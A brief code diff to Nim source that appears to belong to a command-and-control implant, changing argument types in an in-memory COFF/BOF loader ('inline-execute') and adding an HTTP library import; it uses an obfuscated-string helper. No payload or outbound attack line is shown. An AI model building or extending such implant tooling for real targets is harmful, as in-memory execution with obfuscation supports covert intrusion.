@@ -12,6 +12,7 @@ import ../../core/webClientListener
 import std/streams
 import std/os
 import unicode
+import puppy
 
 # Largely based on the excellent NiCOFF project by @frkngksl
 # Source: https://github.com/frkngksl/NiCOFF/blob/main/Main.nim
@@ -247,7 +248,7 @@ proc RunCOFF(functionName:string,fileBuffer:seq[byte],argumentBuffer:seq[byte],m
     return true
 
 # Function to package arguments with DEBUG
-proc PackArguments(args: varargs[string]): seq[byte] =
+proc PackArguments(args: seq[string]): seq[byte] =
   # We'll use a MemStream that works with bytes
   var stream = newStringStream()
   var currentArgIndex = 2 # Arguments start at args[2]
@@ -312,7 +313,7 @@ proc PackArguments(args: varargs[string]): seq[byte] =
   return byteData
 
 # Execute a BOF from an encrypted and compressed stream or from a server file
-proc inlineExecute*(li : Listener, args : varargs[string]) : string =
+proc inlineExecute*(li : webClientListener.Listener, args : seq[string]) : string =
     # Validate arguments
     if (not args.len >= 2):
         result = obf("Invalid number of arguments received. Usage: 'inline-execute [file_id] [entrypoint] <arg1 type1 arg2 type2..>'.")
